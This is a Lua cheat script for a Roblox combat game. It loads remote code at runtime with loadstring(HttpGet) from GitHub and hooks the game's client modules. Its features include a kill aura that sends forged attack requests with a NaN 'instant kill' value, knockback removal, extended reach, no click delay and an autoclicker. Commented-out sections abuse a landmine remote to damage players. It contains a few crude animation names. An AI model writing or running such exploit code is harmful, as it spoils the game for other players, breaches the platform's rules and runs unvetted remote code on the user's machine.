repeat task.wait() until game:IsLoaded()

local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/8pmX8/rektsky4roblox/main/NewRektskyUiLib.lua"))()

local entity = loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/Libraries/entityHandler.lua", true))()


local whiteliststhing = {}

pcall(function()
    whiteliststhing = loadstring(game:HttpGet("https://raw.githubusercontent.com/8pmX8/rektsky4roblox/main/whitelist.lua"))()
end)

do
    local oldcharacteradded = entity.characterAdded
    entity.characterAdded = function(plr, char, localcheck)
        return oldcharacteradded(plr, char, localcheck, function() end)
    end
    entity.fullEntityRefresh()
end

local spawn = function(func) 
    return coroutine.wrap(func)()
end

local getasset = getsynasset or getcustomasset

local ScreenGuitwo = game.CoreGui.RektskyNotificationGui

local function createnotification(title, text, delay2, toggled)
    spawn(function()
        if ScreenGuitwo:FindFirstChild("Background") then ScreenGuitwo:FindFirstChild("Background"):Destroy() end
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 100, 0, 115)
        frame.Position = UDim2.new(0.5, 0, 0, -115)
        frame.BorderSizePixel = 0
        frame.AnchorPoint = Vector2.new(0.5, 0)
        frame.BackgroundTransparency = 0.5
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.Name = "Background"
        frame.Parent = ScreenGuitwo
        local frameborder = Instance.new("Frame")
        frameborder.Size = UDim2.new(1, 0, 0, 8)
        frameborder.BorderSizePixel = 0
        frameborder.BackgroundColor3 = (toggled and Color3.fromRGB(102, 205, 67) or Color3.fromRGB(205, 64, 78))
        frameborder.Parent = frame
        local frametitle = Instance.new("TextLabel")
        frametitle.Font = Enum.Font.SourceSansLight
        frametitle.BackgroundTransparency = 1
        frametitle.Position = UDim2.new(0, 0, 0, 30)
        frametitle.TextColor3 = (toggled and Color3.fromRGB(102, 205, 67) or Color3.fromRGB(205, 64, 78))
        frametitle.Size = UDim2.new(1, 0, 0, 28)
        frametitle.Text = "          "..title
        frametitle.TextSize = 24
        frametitle.TextXAlignment = Enum.TextXAlignment.Left
        frametitle.TextYAlignment = Enum.TextYAlignment.Top
        frametitle.Parent = frame
        local frametext = Instance.new("TextLabel")
        frametext.Font = Enum.Font.SourceSansLight
        frametext.BackgroundTransparency = 1
        frametext.Position = UDim2.new(0, 0, 0, 68)
        frametext.TextColor3 = Color3.new(1, 1, 1)
        frametext.Size = UDim2.new(1, 0, 0, 28)
        frametext.Text = "          "..text
        frametext.TextSize = 24
        frametext.TextXAlignment = Enum.TextXAlignment.Left
        frametext.TextYAlignment = Enum.TextYAlignment.Top
        frametext.Parent = frame
        local textsize = game:GetService("TextService"):GetTextSize(frametitle.Text, frametitle.TextSize, frametitle.Font, Vector2.new(100000, 100000))
        local textsize2 = game:GetService("TextService"):GetTextSize(frametext.Text, frametext.TextSize, frametext.Font, Vector2.new(100000, 100000))
        if textsize2.X > textsize.X then textsize = textsize2 end
        frame.Size = UDim2.new(0, textsize.X + 38, 0, 115)
        pcall(function()
            frame:TweenPosition(UDim2.new(0.5, 0, 0, 20), Enum.EasingDirection.InOut, Enum.EasingStyle.Quad, 0.15)
            game:GetService("Debris"):AddItem(frame, delay2 + 0.15)
        end)
    end)
end

repeat task.wait() until (entity.isAlive)

local lplr = game:GetService("Players").LocalPlayer
local char = lplr.Character
local hrp = char.HumanoidRootPart
local hmd = char.Humanoid
local cam = workspace.CurrentCamera
local RunService = game:GetService("RunService")
local Client = require(game:GetService("ReplicatedStorage").TS.remotes).default.Client

local SwordCont = require(game:GetService("Players").LocalPlayer.PlayerScripts.TS.controllers.global.combat.sword["sword-controller"]).SwordController
local sprintthingy = require(game:GetService("Players").LocalPlayer.PlayerScripts.TS.controllers.global.sprint["sprint-controller"]).SprintController
local kbtable = debug.getupvalue(require(game:GetService("ReplicatedStorage").TS.damage["knockback-util"]).KnockbackUtil.calculateKnockbackVelocity, 1)
local InventoryUtil = require(game:GetService("ReplicatedStorage").TS.inventory["inventory-util"]).InventoryUtil
local itemtablefunc = require(game:GetService("ReplicatedStorage").TS.item["item-meta"]).getItemMeta
local itemtable = debug.getupvalue(itemtablefunc, 1)
local matchend = require(game:GetService("Players").LocalPlayer.PlayerScripts.TS.controllers.game.match["match-end-controller"]).MatchEndController
local matchstate = require(game:GetService("ReplicatedStorage").TS.match["match-state"]).MatchState
local KnitClient = debug.getupvalue(require(lplr.PlayerScripts.TS.knit).setup, 6)
local ballooncontroller = KnitClient.Controllers.BalloonController
local queuemeta = require(game:GetService("ReplicatedStorage").TS.game["queue-meta"]).QueueMeta
local clntstorehandlr = require(game.Players.LocalPlayer.PlayerScripts.TS.ui.store).ClientStore
local matchState = clntstorehandlr:getState().Game.matchState
local itemmeta = require(game:GetService("ReplicatedStorage").TS.item["item-meta"])
local itemstuff = debug.getupvalue(require(game:GetService("ReplicatedStorage").TS.item["item-meta"]).getItemMeta, 1)
local uis = game:GetService("UserInputService")

local realchar
local clone
local function clonemake()
    realchar = lplr.Character
    realchar.Archivable = true
    clone = realchar:Clone()
    clone.Parent = workspace
    lplr.Character = clone
end

local clonetwo
local function secondclonemake()
    clonetwo = realchar:Clone()
    clonetwo.Parent = workspace
end

spawn(function()
    while wait(1) do
        matchState = clntstorehandlr:getState().Game.matchState
    end
end)

local function getremote(tab)
    for i,v in pairs(tab) do
        if v == "Client" then
            return tab[i + 1]
        end
    end
    return ""
end

function hash(p1)
    local hashmod = require(game:GetService("ReplicatedStorage").TS["remote-hash"]["remote-hash-util"])
    local toret = hashmod.RemoteHashUtil:prepareHashVector3(p1)
    return toret
end

local attackentitycont = Client:Get(getremote(debug.getconstants(getmetatable(KnitClient.Controllers.SwordController)["attackEntity"])))  

function getinv(plr)
    local plr = plr or lplr
    local thingy, thingytwo = pcall(function() return InventoryUtil.getInventory(plr) end)
    return (thingy and thingytwo or {
        items = {},
        armor = {},
        hand = nil
    })
end

function getsword()
    local sd
    local higherdamage
    local swordslots
    local swords = getinv().items
    for i, v in pairs(swords) do
        if v.itemType:lower():find("sword") or v.itemType:lower():find("blade") then
            if higherdamage == nil or itemstuff[v.itemType].sword.damage > higherdamage then
                sd = v
                higherdamage = itemstuff[v.itemType].sword.damage
                swordslots = i
            end
        end
    end
    return sd, swordslots
end

local function hvFunc(cock)
    return {hashedval = cock}
end

local killauraissoundenabled = {["Value"] = false}
local killaurasoundvalue = {["Value"] = 1}
local killauraisswingenabled = {["Value"] = false}
local DistVal = {["Value"] = 18}
local killaurafirstpersonanim = {["Value"] = true}
local killauraanimval = {["Value"] = "Cool"}

local function playsound(id, volume) 
    local sound = Instance.new("Sound")
    sound.Parent = workspace
    sound.SoundId = id
    sound.PlayOnRemove = true 
    if volume then 
        sound.Volume = volume
    end
    sound:Destroy()
end

local function isAlive(plr)
	if plr then
		return plr and plr.Character and plr.Character.Parent ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("Humanoid")
	end
	return lplr and lplr.Character and lplr.Character.Parent ~= nil and lplr.Character:FindFirstChild("HumanoidRootPart") and lplr.Character:FindFirstChild("Head") and lplr.Character:FindFirstChild("Humanoid")
end

local function playanimation(id) 
    if isAlive() then 
        local animation = Instance.new("Animation")
        animation.AnimationId = id
        local animatior = lplr.Character.Humanoid.Animator
        animatior:LoadAnimation(animation):Play()
    end
end

local funnyanim = {
    {CFrame = CFrame.new(0.5, -0.01, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.10},
    {CFrame = CFrame.new(0.5, -0.51, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.08},
    {CFrame = CFrame.new(0.5, -0.01, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.08}
}

local autoblockanim = {
    {CFrame = CFrame.new(-0.01, -0.01, -1.01) * CFrame.Angles(math.rad(-90), math.rad(90), math.rad(0)), Time = 0.08},
    {CFrame = CFrame.new(-0.01, -0.01, -1.01) * CFrame.Angles(math.rad(10), math.rad(70), math.rad(-90)), Time = 0.08},
}

local theotherfunnyanim = {
    {CFrame = CFrame.new(-1.8, 0.5, -1.01) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-90)), Time = 0.05},
    {CFrame = CFrame.new(-1.8, -0.21, -1.01) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-90)), Time = 0.05}
}

local kmsanim = {
    {CFrame = CFrame.new(-2.5, -4.5, -0.02) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(-0)), Time = 0.1},
    {CFrame = CFrame.new(-2.5, -1, -0.02) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(-0)), Time = 0.05}
}

local InstantKill = {["Value"] = true}
local rgfejd = false
function KillauraRemote()
    for i,v in pairs(game.Players:GetChildren()) do
        if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("HumanoidRootPart") then
            local mag = (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
            if mag <= DistVal["Value"] and v.Team ~= game.Players.LocalPlayer.Team and v.Character:FindFirstChild("Humanoid") then
                if v.Character.Humanoid.Health > 0 then
                    for k, b in pairs(whiteliststhing) do
                        if v.UserId ~= tonumber(b) then
                            rgfejd = true
                            local GBW = getsword()
                            local selfPosition = lplr.Character.HumanoidRootPart.Position + (DistVal["Value"] > 14 and (lplr.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude > 14 and (CFrame.lookAt(lplr.Character.HumanoidRootPart.Position, v.Character.HumanoidRootPart.Position).lookVector * 4) or Vector3.new(0, 0, 0))
                            local Entity = v.Character
                            local target = v.Character:GetPrimaryPartCFrame().Position
                            attackentitycont:CallServer({
                                ["chargedAttack"] = {["chargeRatio"] = InstantKill["Value"] and (0/0) or 1},
                                ["weapon"] = GBW ~= nil and GBW.tool,
                                ["entityInstance"] = Entity,
                                ["validate"] = {["targetPosition"] = {["value"] = target,
                                    ["hash"] = hvFunc(target)},
                                    ["raycast"] = {
                                        ["cameraPosition"] = hvFunc(cam.CFrame.Position), 
                                        ["cursorDirection"] = hvFunc(Ray.new(cam.CFrame.Position, v.Character:GetPrimaryPartCFrame().Position).Unit.Direction)
                                    },
                                    ["selfPosition"] = {["value"] = selfPosition,
                                        ["hash"] = hvFunc(selfPosition)
                                    }
                                }
                            })
                            if killauraissoundenabled["Value"] then
                                playsound("rbxassetid://6760544639", killaurasoundvalue["Value"])
                            end
                            if killauraisswingenabled["Value"] then         
                                playanimation("rbxassetid://4947108314")
                            end
                        end
                    end
                end
            else
                rgfejd = false
            end
        end
    end 
end

-- targetcheck, isplayertargetable, getallnearesthumanoidtoposition are from vape, i used those for the kill aura anims

local function targetCheck(plr, check)
	return (check and plr.Character.Humanoid.Health > 0 and plr.Character:FindFirstChild("ForceField") == nil or check == false)
end

local function isPlayerTargetable(plr, target)
    return plr ~= lplr and plr and isAlive(plr) and targetCheck(plr, target)
end

local function GetAllNearestHumanoidToPosition(distance, amount)
    local returnedplayer = {}
    local currentamount = 0
    if entity.isAlive then -- alive check
        for i, v in pairs(game.Players:GetChildren()) do -- loop through players
            if isPlayerTargetable((v), true, true, v.Character ~= nil) and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Head") and currentamount < amount then -- checks
                local mag = (lplr.Character.HumanoidRootPart.Position - v.Character:FindFirstChild("HumanoidRootPart").Position).magnitude
                if mag <= distance then -- mag check
                    table.insert(returnedplayer, v)
                    currentamount = currentamount + 1
                end
            end
        end
        for i2,v2 in pairs(game:GetService("CollectionService"):GetTagged("Monster")) do -- monsters
            if v2:FindFirstChild("HumanoidRootPart") and currentamount < amount and v2.Name ~= "Duck" then -- no duck
                local mag = (lplr.Character.HumanoidRootPart.Position - v2.HumanoidRootPart.Position).magnitude
                if mag <= distance then -- magcheck
                    table.insert(returnedplayer, {Name = (v2 and v2.Name or "Monster"), UserId = 1443379645, Character = v2}) -- monsters are npcs so I have to create a fake player for target info
                    currentamount = currentamount + 1
                end
            end
        end
    end
    return returnedplayer -- table of attackable entities
end

local germanthingy = false
function funianimthing()
    
end

local isclone = false

--[[function kickKillauraRemote()
    if (not isclone) then
        local mouse = game.Players.LocalPlayer:GetMouse()
        for i,v in pairs(game.Players:GetChildren()) do
            if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("HumanoidRootPart") then
                local mag = (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                if mag <= 20 and v.Team ~= game.Players.LocalPlayer.Team and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
                    if v.Character:FindFirstChild("Head") then
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged[landmineremote]:FireServer({
                            ["invisibleLandmine"] = v.Character.Head
                        })
                    end
                end
            end
        end 
    else
        local mouse = game.Players.LocalPlayer:GetMouse()
        for i,v in pairs(game.Players:GetChildren()) do
            if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("HumanoidRootPart") then
                local mag = (v.Character.HumanoidRootPart.Position - clone.HumanoidRootPart.Position).Magnitude
                if mag <= 20 and v.Team ~= game.Players.LocalPlayer.Team and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
                    if v.Character:FindFirstChild("Head") then
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged[landmineremote]:FireServer({
                            ["invisibleLandmine"] = v.Character.Head                
                        })
                    end
                end
            end
        end 
    end
end--]]

local function getItem(itemName)
	for i5, v5 in pairs(getinv(lplr)["items"]) do
		if v5["itemType"] == itemName then
			return v5, i5
		end
	end
	return nil
end

local function getwool()
	for i5, v5 in pairs(getinv(lplr)["items"]) do
		if v5["itemType"]:match("wool") or v5["itemType"]:match("grass") then
			return v5["itemType"], v5["amount"]
		end
	end	
	return nil
end

local Flamework = require(game.ReplicatedStorage["rbxts_include"]["node_modules"]["@flamework"].core.out).Flamework
repeat task.wait() until (Flamework.isInitialized)

local BlockController2 = require(game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out.client.placement["block-placer"]).BlockPlacer
local blockcontroller = require(game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out).BlockEngine
local BlockEngine = require(lplr.PlayerScripts.TS.lib["block-engine"]["client-block-engine"]).ClientBlockEngine
local blocktable = BlockController2.new(BlockEngine, getwool())
function placeblockthing(newpos, customblock)
    local placeblocktype = (customblock or getwool())
    blocktable.blockType = placeblocktype
    if blockcontroller:isAllowedPlacement(lplr, placeblocktype, Vector3.new(newpos.X / 3, newpos.Y / 3, newpos.Z / 3)) and getItem(placeblocktype) then
        return blocktable:placeBlock(Vector3.new(newpos.X / 3, newpos.Y / 3, newpos.Z / 3))
    end
end

lib:CreateWindow()

local Tabs = {
    ["Combat"] = lib:CreateTab("Combat",Color3.fromRGB(252, 60, 68),"combat"),
    ["Movement"] = lib:CreateTab("Movement",Color3.fromRGB(255, 148, 36),"movement"),
    ["Render"] = lib:CreateTab("Render",Color3.fromRGB(59, 170, 222),"render"),
    ["Player"] = lib:CreateTab("Player",Color3.fromRGB(83, 214, 110),"player"),
    ["Exploits"] = lib:CreateTab("Exploits",Color3.fromRGB(157, 39, 41),"exploit"),
    ["Rektsky"] = lib:CreateTab("RektSky",Color3.fromRGB(64,124,252),"rektsky"),
    ["World"] = lib:CreateTab("World",Color3.fromRGB(52,28,228),"world")
}

-- COMBAT

do
    local oldbs
    local conectionkillaura
    local animspeed = {["Value"] = 0.3}
    local origC0 = game.ReplicatedStorage.Assets.Viewmodel.RightHand.RightWrist.C0
    local katog = Tabs["Combat"]:CreateToggle({
        ["Name"] = "KillAura",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            local kauraval = v
            repeat task.wait() until (matchState == 1)
            spawn(function()
                if (kauraval) then
                    repeat
                        task.wait()
                        if (not kauraval) then break end
                        if entity.isAlive then
                            KillauraRemote()
                        end
                    until (not kauraval)
                else
                    return
                end
            end)
            spawn(function()
                repeat
                    if (not kauraval) then return end
                    task.wait(animspeed["Value"])
                    local plrthinglopl = GetAllNearestHumanoidToPosition(DistVal["Value"], 1)
                    if plrthinglopl then
                        for i,v in pairs(plrthinglopl) do
                            if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("HumanoidRootPart") then
                                if v.Team ~= tostring(lplr.Team) then
                                    if killaurafirstpersonanim["Value"] then
                                        if killauraanimval["Value"] == "Cool" then
                                            if entity.isAlive and cam.Viewmodel.RightHand.RightWrist and origC0 then
                                                for i, v in pairs(autoblockanim) do
                                                    coolanimlol = game:GetService("TweenService"):Create(cam.Viewmodel.RightHand.RightWrist, TweenInfo.new(v.Time), {C0 = origC0 * v.CFrame})
                                                    coolanimlol:Play()
                                                    task.wait(v.Time - 0.01)
                                                end
                                            end
                                        elseif killauraanimval["Value"] == "German" then
                                            if entity.isAlive and cam.Viewmodel.RightHand.RightWrist and origC0 then
                                                for i, v in pairs(funnyanim) do
                                                    killauracurrentanim = game:GetService("TweenService"):Create(cam.Viewmodel.RightHand.RightWrist, TweenInfo.new(v.Time), {C0 = origC0 * v.CFrame})
                                                    killauracurrentanim:Play()
                                                    task.wait(v.Time - 0.01)
                                                end
                                            end
                                        elseif killauraanimval["Value"] == "Penis" then
                                            if entity.isAlive and cam.Viewmodel.RightHand.RightWrist and origC0 then
                                                for i, v in pairs(theotherfunnyanim) do
                                                    killauracurrentanim = game:GetService("TweenService"):Create(cam.Viewmodel.RightHand.RightWrist, TweenInfo.new(v.Time), {C0 = origC0 * v.CFrame})
                                                    killauracurrentanim:Play()
                                                    task.wait(v.Time - 0.01)
                                                end
                                            end
                                        elseif killauraanimval["Value"] == "KillMyself" then
                                            if entity.isAlive and cam.Viewmodel.RightHand.RightWrist and origC0 then
                                                for i, v in pairs(kmsanim) do
                                                    killauracurrentanim = game:GetService("TweenService"):Create(cam.Viewmodel.RightHand.RightWrist, TweenInfo.new(v.Time), {C0 = origC0 * v.CFrame})
                                                    killauracurrentanim:Play()
                                                    task.wait(v.Time - 0.01)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                        if killauraanimval["Value"] == "Cool" then
                            if (not rgfejd) then
                                newthingy = game:GetService("TweenService"):Create(cam.Viewmodel.RightHand.RightWrist, TweenInfo.new(0.1), {C0 = origC0})
                                newthingy:Play()
                            end
                        end
                        if killauraanimval["Value"] == "KillMyself" then
                            if (not rgfejd) then
                                sdfsdf = game:GetService("TweenService"):Create(cam.Viewmodel.RightHand.RightWrist, TweenInfo.new(0.1), {C0 = origC0 * CFrame.new(-2.5, -4.5, -0.02) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(-0))})
                                sdfsdf:Play()
                            end
                        end
                    end
                until (not kauraval)
            end)
        end
    })
    killauraissoundenabled = katog:CreateOptionTog({
        ["Name"] = "Swing Sound",
        ["Default"] = true,
        ["Func"] = function() end
    })
    InstantKill = katog:CreateOptionTog({
        ["Name"] = "Instant Kill",
        ["Default"] = true,
        ["Func"] = function() end
    })
    killaurasoundvalue = katog:CreateSlider({
        ["Name"] = "Sound",
        ["Function"] = function() end,
        ["Min"] = 0,
        ["Max"] = 1,
        ["Default"] = 0.2,
        ["Round"] = 1
    })
    killauraisswingenabled = katog:CreateOptionTog({
        ["Name"] = "Swing Animation",
        ["Default"] = true,
        ["Func"] = function() end
    })
    DistVal = katog:CreateSlider({
        ["Name"] = "Distance",
        ["Function"] = function() end,
        ["Min"] = 1,
        ["Max"] = 20,
        ["Default"] = 20,
        ["Round"] = 1
    })
    killaurafirstpersonanim = katog:CreateOptionTog({
        ["Name"] = "Anims (1rs person)",
        ["Default"] = true,
        ["Func"] = function() end
    })
    killauraanimval = katog:CreateDropDown({
        ["Name"] = "AnimMode",
        ["Function"] = function(val)
            if val == "German" then
                zdsqzd = game:GetService("TweenService"):Create(cam:WaitForChild("Viewmodel").RightHand.RightWrist, TweenInfo.new(0.1), {C0 = origC0 * CFrame.new(0.5, -0.01, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56))})
                zdsqzd:Play()
            elseif val == "Penis" then
                cock = game:GetService("TweenService"):Create(cam:WaitForChild("Viewmodel").RightHand.RightWrist, TweenInfo.new(0.1), {C0 = origC0 * CFrame.new(-1.8, 0.5, -1.01) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-90))})
                cock:Play()
            elseif val == "KillMyself" then
                sdfsdf = game:GetService("TweenService"):Create(cam:WaitForChild("Viewmodel").RightHand.RightWrist, TweenInfo.new(0.1), {C0 = origC0 * CFrame.new(-2.5, -4.5, -0.02) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(-0))})
                sdfsdf:Play()
            end
        end,
        ["List"] = {"Cool", "German", "Penis", "KillMyself"},
        ["Default"] = "Cool"
    })
    animspeed = katog:CreateSlider({
        ["Name"] = "AnimationSpeed",
        ["Function"] = function() end,
        ["Min"] = 0.1,
        ["Max"] = 0.5,
        ["Default"] = 0.3,
        ["Round"] = 1
    })
end


--[[local conectionkillauraV2
Tabs["Combat"]:CreateToggle({
    ["Name"] = "KillAuraV2",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        local kauravalv2 = v
        repeat task.wait() until (matchState == 1)
        if matchState == 1 then
            spawn(function()
                if kauravalv2 and entity.isAlive then
                    conectionkillauraV2 = RunService.RenderStepped:Connect(function(step)
                        if not kauravalv2 then 
                            return
                        end
                        if entity.isAlive then
                            if (not isclone) then
                                local mouse = game.Players.LocalPlayer:GetMouse()
                                for i,v in pairs(game.Players:GetChildren()) do
                                    if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("HumanoidRootPart") then
                                        local mag = (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                                        if mag <= 20 and v.Team ~= game.Players.LocalPlayer.Team and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
                                            if v.Character:FindFirstChild("Head") then
                                                game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged[landmineremote]:FireServer({
                                                    ["invisibleLandmine"] = v.Character.Head                                        
                                                })
                                            end
                                        end
                                    end
                                end 
                            else
                                local mouse = game.Players.LocalPlayer:GetMouse()
                                for i,v in pairs(game.Players:GetChildren()) do
                                    if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("HumanoidRootPart") then
                                        local mag = (v.Character.HumanoidRootPart.Position - clone.HumanoidRootPart.Position).Magnitude
                                        if mag <= 20 and v.Team ~= game.Players.LocalPlayer.Team and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
                                            if v.Character:FindFirstChild("Head") then
                                                game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged[landmineremote]:FireServer({
                                                    ["invisibleLandmine"] = v.Character.Head                                        
                                                })
                                            end
                                        end
                                    end
                                end 
                            end
                        end
                    end)
                else
                    conectionkillauraV2:Disconnect()
                    return
                end
            end)
        end
    end
})--]]

--[[local TPAURAFUNIv2
local tpaurafunihaha
tpaurafunihaha = Tabs["Combat"]:CreateToggle({
    ["Name"] = "TPAura",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        TPAURAFUNIv2 = v
        repeat task.wait() until (matchState == 1)
        secondclonemake()
        if matchState == 1 then
            spawn(function()
                if TPAURAFUNIv2 and entity.isAlive then
                    if entity.isAlive then
                        repeat
                            wait()
                            if (not TPAURAFUNIv2) then return end
                            spawn(function()
                                wait()
                                local mouse = game.Players.LocalPlayer:GetMouse()
                                for i,v in pairs(game.Players:GetChildren()) do
                                    if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("HumanoidRootPart") then
                                        local mag = (v.Character.HumanoidRootPart.Position - clonetwo.HumanoidRootPart.Position).Magnitude
                                        if mag <= 20 and v.Team ~= game.Players.LocalPlayer.Team and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
                                            if v.Character:FindFirstChild("Head") then
                                                game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged[landmineremote]:FireServer({
                                                    ["invisibleLandmine"] = v.Character.Head                                        
                                                })
                                            end
                                        end
                                    end
                                end 
                            end)
                            spawn(function()
                                local plrthing = GetAllNearestHumanoidToPosition(600, 1)
                                for i, plr in pairs(plrthing) do
                                    clonetwo.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame
                                    wait(0.6)
                                    clonetwo.HumanoidRootPart.CFrame = clone.HumanoidRootPart.CFrame
                                    wait(0.6)
                                end
                            end)
                            spawn(function()
                                repeat task.wait() until (matchState == 2)
                                tpaurafunihaha:Toggle()
                            end)
                        until (not TPAURAFUNIv2)
                    end
                else
                    clonetwo:remove()
                    return
                end
            end)
        end
    end
})--]]

--[[ 
local ShieldRemote = getremote(debug.getconstants(debug.getprotos(getmetatable(KnitClient.Controllers.ShieldController).raiseShield)[1]))
local connectionkaurablock
Tabs["Combat"]:CreateToggle({
    ["Name"] = "AutoBlockKillAura",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if v and entity.isAlive then
            connectionkaurablock = game:GetService("RunService").Stepped:connect(function()
                spawn(function()
                    task.wait()
                    if not v then
                        connectionkaurablock:Disconnect()
                        return 
                    end
                    Client:Get(ShieldRemote):SendToServer({["raised"] = true})
                    KillauraRemote()
                end)
            end)
        else
            connectionkaurablock:Disconnect()
            return
        end
    end
})
--]]

do
    local velohorizontal = {["Value"] = 0}
    local velovertical = {["Value"] = 0}
    local velocitytog = Tabs["Combat"]:CreateToggle({
        ["Name"] = "Velocity",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            getgenv().veloval = v
            spawn(function()
                if getgenv().veloval then
                    if not hmd then return end
                    if hmd then
                        kbtable["kbDirectionStrength"] = 0
                        kbtable["kbUpwardStrength"] = 0
                    end
                else
                    kbtable["kbDirectionStrength"] = 100
                    kbtable["kbUpwardStrength"] = 100
                    return
                end
            end)
        end
    })
    velohorizontal = velocitytog:CreateSlider({
        ["Name"] = "Horizontal",
        ["Function"] = function() 
            if hmd then
                kbtable["kbDirectionStrength"] = velohorizontal["Value"]
            end
        end,
        ["Min"] = 0,
        ["Max"] = 100,
        ["Default"] = 0,
        ["Round"] = 0
    })
    velovertical = velocitytog:CreateSlider({
        ["Name"] = "Vertical",
        ["Function"] = function() 
            if hmd then
                kbtable["kbUpwardStrength"] = velovertical["Value"]
            end
        end,
        ["Min"] = 0,
        ["Max"] = 100,
        ["Default"] = 0,
        ["Round"] = 0
    })
end

local itemtab = debug.getupvalue(require(game:GetService("ReplicatedStorage").TS.item["item-meta"]).getItemMeta, 1)
local CombatConstant = require(game:GetService("ReplicatedStorage").TS.combat["combat-constant"]).CombatConstant

local function getEquipped()
    local typetext = ""
    local obj = (entity.isAlive and lplr.Character:FindFirstChild("HandInvItem") and lplr.Character.HandInvItem.Value or nil)
    if obj then
        if obj.Name:find("sword") or obj.Name:find("blade") or obj.Name:find("baguette") or obj.Name:find("scythe") or obj.Name:find("dao") then
            typetext = "sword"
        end
        if obj.Name:find("wool") or itemtab[obj.Name]["block"] then
            typetext = "block"
        end
        if obj.Name:find("bow") then
            typetext = "bow"
        end
    end
    return {["Object"] = obj, ["Type"] = typetext}
end

do
    local ACC1
    local ACC2
    local testtogttt = {["Value"] = 2}
    local autoclickertog = Tabs["Combat"]:CreateToggle({
        ["Name"] = "AutoClicker",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            if v then
                local holding = false
                ACC1 = uis.InputBegan:connect(function(input, gameProcessed)
                    if gameProcessed and input.UserInputType == Enum.UserInputType.MouseButton1 then
                        holding = true
                    end
                end)
                ACC2 = uis.InputEnded:connect(function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        holding = false
                    end
                end)
                spawn(function()
                    repeat
                        task.wait(1/testtogttt["Value"])
                        if holding then
                            if holding == false then return end
                            if getEquipped()["Type"] == "sword" then 
                                if holding == false then return end
                                SwordCont:swingSwordAtMouse()
                            end
                        end
                    until (not v)
                end)
            else
                ACC1:Disconnect()
                ACC2:Disconnect()
                return
            end
        end
    })
    testtogttt = autoclickertog:CreateSlider({
        ["Name"] = "CPS",
        ["Function"] = function() end,
        ["Min"] = 1,
        ["Max"] = 20,
        ["Default"] = 20,
        ["Round"] = 0
    })
end

Tabs["Combat"]:CreateToggle({
    ["Name"] = "NoClickDelay",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        getgenv().funisus = v
        spawn(function()
            if getgenv().funisus and entity.isAlive then
                for i2,v2 in pairs(itemtable) do
                    if type(v2) == "table" and rawget(v2, "sword") then
                        v2.sword.attackSpeed = 0.000000001
                    end
                    SwordCont.isClickingTooFast = function() return false end
                end
            else
            end
        end)
    end
})

do
    local reachvalue = {["Value"] = 18}
    local reachtog = Tabs["Combat"]:CreateToggle({
        ["Name"] = "Reach",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            getgenv().reachval = v
            if getgenv().reachval then
                CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = reachvalue["Value"]
            else
                CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = 14.4
            end
        end
    })
    reachvalue = reachtog:CreateSlider({
        ["Name"] = "Reach",
        ["Function"] = function() 
            CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = reachvalue["Value"]
        end,
        ["Min"] = 1,
        ["Max"] = 18,
        ["Default"] = 18,
        ["Round"] = 1
    })
end

